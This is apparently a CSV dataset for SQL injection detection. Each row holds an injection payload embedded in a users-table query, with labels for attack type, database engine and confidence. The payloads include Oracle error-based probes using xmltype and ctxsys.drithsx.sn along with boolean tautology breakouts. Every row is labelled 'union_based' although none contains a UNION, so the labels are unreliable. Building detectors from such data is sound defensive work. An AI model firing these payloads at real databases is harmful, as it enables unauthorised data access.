id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
12595,"select * from users WHERE username = ""-7746\' ) ) ) or username = ""1\' ) ) as plbt where 4368 = 4368 or username = ""1\' ) ) as bswc where 1635 = 1635 or username = ""-9501\' ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual )",union_based,oracle,1.0,"Signals: 'xmltype', 'chr', 'case'; UNION-based payload detected; DB: oracle",0
12596,"select * from users WHERE username = ""1\' ) ) ) and username = ""1\' ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( \'izyf\' = \'izyf""",union_based,oracle,1.0,"Signals: 'xmltype', 'chr', 'case'; UNION-based payload detected; DB: oracle",0
12597,"select * from users WHERE username = ""1\' ) ) ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) or username = ""-8007\' ) ) as bgpp where 9555 = 9555 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --""",union_based,oracle,1.0,"Signals: 'xmltype', 'chr', 'case'; UNION-based payload detected; DB: oracle",0
12598,"select * from users WHERE username = ""-1889%\' ) ) ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( \'%\' = \'"" and username = ""-2992\' ) ) and ( ( \'tjgt\' = \'tjgt""",union_based,oracle,1.0,"Signals: 'chr', 'case', 'ctxsys'; UNION-based payload detected; DB: oracle",0
12599,"select * from users WHERE username = ""-2028%\' ) ) ) and ( ( ( \'%\' = \'"" and username = ""-7323%"" or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual )",union_based,oracle,1.0,"Signals: 'xmltype', 'chr', 'case'; UNION-based payload detected; DB: oracle",0
12521,"select * from users WHERE username = ""1\'|| ( select \'rjis\' from dual where 7696 = 7696 and username = ""-8112\' ) ) ) and ( ( ( \'xopg\' = \'xopg"" or username = ""1\' ) or username = ""1\' ) )",union_based,oracle,0.9,Signals: 'dual'; UNION-based payload detected; DB: oracle,0
12423,"select * from users WHERE username = ""-6079 ) ) ) and ( ( ( 8708 = 8708"" or username = ""1\' ) where 1502 = 1502 and ( \'mndw\' = \'mndw""",union_based,generic,0.7,UNION-based payload detected. Payload length: 136 chars.,0
12425,"select * from users WHERE username = ""-8353\' ) ) ) and ( ( ( \'ptlz\' = \'ptlz"" and username = ""1\' ) ) ) and ( ( ( \'xpks\' like \'xpks""",union_based,generic,0.7,UNION-based payload detected. Payload length: 138 chars.,0
12436,"select * from users WHERE username = ""-5880\' ) ) and ( ( \'rwgl\' = \'rwgl"" or username = ""-2495 ) ) as hudw where 4197 = 4197",union_based,generic,0.7,UNION-based payload detected. Payload length: 127 chars.,0
12446,"select * from users WHERE username = ""-2348 ) as sige where 1639 = 1639 and username = ""-7199\' and \'qibr\' = \'qibr"" and username = ""-1344 ) as gqgi where 2545 = 2545",union_based,generic,0.7,UNION-based payload detected. Payload length: 168 chars.,0
12454,"select * from users WHERE username = ""-5291\' ) ) or username = ""-7072\' ) and ( ( ( 9548 = 9548"" or username = ""-1021 ) as erjh where 7845 = 7845",union_based,generic,0.7,UNION-based payload detected. Payload length: 146 chars.,0
12465,"SELECT * FROM users WHERE username = ""-6203\' ) ) ) and ( ( ( \'luee\' = \'luee"" AND username = ""1\' ) ) as bswc where 1635 = 1635",union_based,generic,0.7,UNION-based payload detected. Payload length: 130 chars.,0
12511,"select * from users WHERE username = ""1\' ) ) and ( ( \'cbwx\' = \'cbwx"" and username = ""1 where 5161 = 5161 or username = ""-4322\' ) ) as magw where 1627 = 1627",union_based,generic,0.7,UNION-based payload detected. Payload length: 161 chars.,0
12550,"select * from users WHERE username = ""-7242\' and \'kfff\' = \'kfff"" and username = ""-8163 ) ) as cvai where 2360 = 2360",union_based,generic,0.7,UNION-based payload detected. Payload length: 120 chars.,0
